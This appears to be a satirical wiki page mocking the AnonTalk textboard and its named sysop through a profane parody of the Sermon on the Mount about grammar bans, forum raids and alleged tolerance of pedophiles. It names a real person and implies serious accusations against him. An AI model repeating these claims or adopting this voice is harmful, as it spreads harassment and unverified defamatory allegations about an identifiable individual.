{{quote|I've really put my soul into this carefully crafted piece of art (do you think that is that going too far?)|Kimmo Johan Alm, going too far}}

{{quote|I especially liked the bulletins from "The Board." They brought a bit of humour into the place and I thought they were a good idea.|[[Kimmo_Johan_Alm|Anonymous A]], not fooling anybody}}


=Copypasta=
A reading from the Book of Kimmo:
#And seeing the multitudes, Sysop went up into a lock-down mode: and when he was set, his wiseguys came unto him: And he opened his mouth, and taught them, saying:
#Fucked are the poor in grammar: for they are the scum of the earth.
#Blessed are they that know grammar: for no shitlist awaits them.
#Fucked are those who argue against loli-lovers: for the pedo shall inherit the AnonTalk.
#Blessed are they which do hunger and thirst after lolis: for they shall be satisfied by this site.
#Fucked are those who sympathise towards those poor of grammar : for they shall obtain shitlisting.
#Blessed are those who report the slightest error: for they shall see wiseguy status.
#Fucked are the authorities: for they cannot pin anything on us.
#Blessed are they which do attack our enemies forums: for theirs is the gratitude of Sysop.
#Fucked are ye, when men shall raid you, and attack you, and shall say all manner of evil against you falsely, for my sake.
#Rejoice, and be exceeding glad: for great is your reward in AnonTalk: for so persecuted they the prophets which were before you.
#Ye are the AnTs of the earth: but if an AnT have lost his ability to proof-read, wherewith shall he be taked? It is thenceforth good for nothing, but to be cast out, and to be shitlisted under foot of men.
#Ye are the light of the world. A site that is set on an hill cannot be shut down.
#Neither do men read a dictionary, and put it not into a bookshelf, but on a podium; and it gives correct spelling unto all that are in the immediate area.
#Let your ability to punctuate, spell and structure so shine before men, that they may see your good works, and glorify your Sysop which is in grammar heaven.
#Think not that I have come to destroy the Internet, or the people who run it: I am not come to destroy, but to teach grammar.
#For grammar I say unto you, Till heaven and earth pass, one error or one lack of period shall in no wiseguy pass from the shitlist, till all be fulfilled.
#Whosoever therefore shall break one of these least grammar commandments, and shall teach men so, he shall be called the least in the shitlist: but whosoever shall do and teach them, the same shall be called great in the ICare group.
#For I say unto you, That except your grammar shall exceed the grammar of the wiseguys and Sysop, ye shall in no case enter into the kingdom of AnonTalk.
#Ye have heard that it was said of them of old time, Thou shalt not capitalise randomly; and whosoever shall capitalise randomly shall be in danger of the shitlist:
#But I say unto you, That whosoever is angry with his Sysop without a cause shall be in danger of the shitlist: and whosoever shall say to his Sysop, I hate punctuating, shall be in danger of the shitlist: but whosoever shall say, Thou suck, shall be in danger of shitlisting.
#Therefore if thou bring thy gift to the Internet, and there remembers that thy Sysop hath ought against thee;
#Leave there thy donation before the altar, and go thy way; first be reconciled to thy Sysop, and then come and offer thy donation.
#Agree with thine adversary quickly, whiles thou art in the way with him; lest at any time the adversary raid thee to the downtime, and the downtime deliver thee to the lack of grammar, and thou be cast into the shitlist.
#Verily I say unto thee, Thou shalt by no means come out thence, till thou hast paid the uttermost attention to the recent bulletins.
#Ye have heard that it was said by them of old time, Thou shalt not commit raids:
#But I say unto you, That whosoever looks on a site to intention to raid after it hath committed a raid against it already in his heart.
#And if thy views eye offend me, pluck them out out, and cast them from thee: for it is profitable for thee that one of thy dogmas should perish, and not that thy whole body should be cast into the shitlist.
#And if thy typing hand hand betrays thee, cut it off, and cast it from thee: for it is profitable for thee that one of thy hands should perish, and not that thy whole body should be cast into the shitlist.
#It hath been said, Whosoever shall state his anti-pedo views, let him write:
#But I say unto you, That whosoever shall put away his pro-pedo attitudes, saving for the cause of agreeing with a bulletin, causes himself to commit to the shitlist: and whosoever shall state those views goes to the shitlist.
#Again, ye have heard that it hath been said by them of old time, Thou shalt not proof-read seven times over , but shalt merely post and edit later:
#But I say unto you, proof-read at all times; by AnonTalk; for it is Sysop's throne: by the Internet; for it is his footstool: by topics; for it is the domain of the great Sysop.
#Neither shalt thou not proof-read by thy head, because thou canst not hide from the shitlist.
#But let your communication be, Yea, yea; Nay, nay: for whatsoever is more than these comes of the shitlist.
#Ye have heard that it hath been said, A shitlisting for a shitlisting, and a ban for a ban: But I say unto you, That ye resist not evil: but whosoever shall smite thee on thy right cheek, report him.
#And if any man will accuse thee at the rules, and take away thy intention to report, let him have thy report also. And whosoever shall compel thee to go a mile, go with him to the shitlist.
#Give to him that asks thee for grammar tips, and from him that would report of thee turn not thou away.
#Ye have heard that it hath been said, Thou shalt love thy fellow AnTs, and hate thine other sites.
#But I say unto you, Love your other sites, educate with grammar them that curse you, tell to punctuate those that hate you, and shitlist them which evilliy use you, and ban you;
#That ye may be the children of your Sysop which is in AnonTalk: for he makes his site to rise on the evil and on the good, and send grammar rules on the just and on the unjust.
#For if ye use AnonTalk with those who use it alongside you, what reward have ye? Do not even the Sysop the same? And if ye salute your brethren only, what do ye more than others? do not even the Sysop so?
#Be ye therefore perfect, even as your Sysop which is in AnonTalk is perfect.
Here endeth the first reading.

(Unless you're a pedosheep, if you want an anonymous text board, there's lots of other choices to use.)
<!--- Do not include sites that are imageboards, pedo sites, or that are run by people who moderate just like Kimmo Alm.  The purpose is that even if they have little traffic, these are better than AnonTalk the same as. --->
<!--- ATTBS sites are all on the original overtalk http://oosu.net/atbbs/ and the illegal clone of the original overtalk http://overtalk.org and this list is only the ones that on there that aren't broken links, allow posting, are actual textboards instead of imageboards, are *not* pedo, and are *not* run by people who moderate just like Kimmo Alm.
